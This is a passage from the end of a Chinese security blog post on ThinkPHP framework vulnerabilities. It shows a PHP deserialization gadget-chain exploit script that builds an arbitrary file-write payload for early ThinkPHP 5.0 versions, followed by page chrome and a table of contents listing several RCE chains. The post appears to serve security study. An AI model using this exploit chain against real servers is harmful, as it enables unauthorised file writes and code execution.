class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">styles</span> = [</span><br><span class="line">            &#x27;<span class="title class_">where</span>&#x27;</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> \think\session\driver\<span class="title function_ invoke__">Memcache</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcache</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> \think\cache\driver\<span class="title function_ invoke__">Memcached</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable">$path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span> =&gt; <span class="variable">$path</span>,</span><br><span class="line"><span class="comment">//                &#x27;path&#x27; =&gt; &#x27;php://filter/convert.base64-decode/resource=&#x27; . $path,</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">path</span> = &quot;<span class="title class_">file_path</span>/<span class="title class_">file_name</span>&quot;;</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;file_content&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$payload</span> = <span class="keyword">new</span> \think\<span class="title function_ invoke__">Process</span>(<span class="variable">$path</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">dump_object_graph</span>(<span class="variable">$payload</span>,<span class="string">&quot;TPFW2.svg&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> ThinkPHP 框架安全</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-07-28 23:10:49</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-08-19 01:11:42
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/07/28/ThinkPHP 框架安全/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/php-web/">#php web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/07/31/PHP%20%E7%89%B9%E6%80%A7%E4%B8%8E%E7%BB%95%E8%BF%87/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">PHP 特性与绕过</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/04/12/VS%20%E7%A0%94%E7%A9%B6/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">VS 研究</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">ThinkPHP 框架安全</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%9F%BA%E7%A1%80"><span class="nav-text">环境基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%88%9B%E5%BB%BA"><span class="nav-text">项目创建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84"><span class="nav-text">项目结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ThinkPHP5"><span class="nav-text">ThinkPHP5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ThinkPHP6"><span class="nav-text">ThinkPHP6</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8"><span class="nav-text">框架使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MVC-%E6%9E%B6%E6%9E%84"><span class="nav-text">MVC 架构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Controller%EF%BC%9A%E6%8E%A7%E5%88%B6%E5%99%A8%E5%B1%82%EF%BC%88%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%EF%BC%89"><span class="nav-text">Controller：控制器层（业务流程控制）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Model%EF%BC%9A%E6%A8%A1%E5%9E%8B%E5%B1%82%EF%BC%88%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE%E4%B8%8E%E5%B0%81%E8%A3%85%EF%BC%89"><span class="nav-text">Model：模型层（数据访问与封装）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#View%EF%BC%9A%E8%A7%86%E5%9B%BE%E5%B1%82%EF%BC%88%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%EF%BC%89"><span class="nav-text">View：视图层（页面展示）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E6%A8%A1%E5%9D%97%E6%A8%A1%E5%BC%8F"><span class="nav-text">多模块模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E8%AE%BF%E9%97%AE%E5%BD%A2%E5%BC%8F"><span class="nav-text">路由访问形式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90"><span class="nav-text">框架分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84"><span class="nav-text">框架结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%90%AF%E5%8A%A8"><span class="nav-text">框架启动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E5%8F%91"><span class="nav-text">路由分发</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">远程代码执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5"><span class="nav-text">SQL 注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE1%EF%BC%88%E5%BD%B1%E5%93%8D-5-1-x-5-2-x%EF%BC%89"><span class="nav-text">RCE1（影响 5.1.x - 5.2.x）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-text">调用链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE2%EF%BC%88%E5%BD%B1%E5%93%8D-5-0-x%EF%BC%89"><span class="nav-text">RCE2（影响 5.0.x）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-1"><span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-1"><span class="nav-text">调用链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-1"><span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE3%EF%BC%88%E5%BD%B1%E5%93%8D-6-0-1-%EF%BC%89"><span class="nav-text">RCE3（影响 6.0.1+）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-2"><span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-2"><span class="nav-text">调用链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-2"><span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE4%EF%BC%88%E5%BD%B1%E5%93%8D-6-0-1-%EF%BC%89"><span class="nav-text">RCE4（影响 6.0.1+）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-3"><span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-3"><span class="nav-text">调用链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-3"><span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FW1%EF%BC%88%E5%BD%B1%E5%93%8D-5-0-4-5-0-24%EF%BC%89"><span class="nav-text">FW1（影响 5.0.4 - 5.0.24）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-4"><span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-4"><span class="nav-text">调用链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-4"><span class="nav-text">利用脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FW2%EF%BC%88%E5%BD%B1%E5%93%8D-5-0-0-5-0-3%EF%BC%89"><span class="nav-text">FW2（影响 5.0.0 - 5.0.3）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-5"><span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-5"><span class="nav-text">调用链分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-5"><span class="nav-text">利用脚本</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        56 posts in total
                    </span>
                    
                        <span>
                            1114.7k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>